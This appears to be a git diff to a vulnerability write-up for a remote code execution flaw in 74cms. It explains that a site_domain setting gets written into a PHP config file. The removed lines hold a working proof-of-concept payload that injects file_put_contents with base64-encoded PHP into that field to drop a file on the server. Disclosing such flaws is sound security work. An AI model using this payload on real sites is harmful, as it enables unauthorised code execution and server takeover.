@@ -33,12 +33,12 @@ multimerge($config, $new_config) -> file_put_contents($config_file, "<?php \nret
 8. /Application/Home/Conf/url.php: The code after "return array(...);" does not work, so payload is site_domain=', {your php code},'  
 ![image](https://github.com/BigTiger2020/74cms-rce/blob/main/10.png)    
 
-* POC  
-<?php phpinfo();?> -> PD9waHAgcGhwaW5mbygpOz8+
-site_domain=', file_put_contents('403.php',base64_decode('PD9waHAgcGhwaW5mbygpOz8+')),'  
-![image](https://github.com/BigTiger2020/74cms-rce/blob/main/04.png)   
-![image](https://github.com/BigTiger2020/74cms-rce/blob/main/01.png)   
-![image](https://github.com/BigTiger2020/74cms-rce/blob/main/03.png)   
-![image](https://github.com/BigTiger2020/74cms-rce/blob/main/02.png) 
+* POC
+![image](https://github.com/BigTiger2020/74cms-rce/blob/main/13.png) 
+* Steps to reproduce
+1. ![image](https://github.com/BigTiger2020/74cms-rce/blob/main/04.png)   
+2. ![image](https://github.com/BigTiger2020/74cms-rce/blob/main/01.png)   
+3. ![image](https://github.com/BigTiger2020/74cms-rce/blob/main/03.png)   
+4. ![image](https://github.com/BigTiger2020/74cms-rce/blob/main/02.png) 
 
 
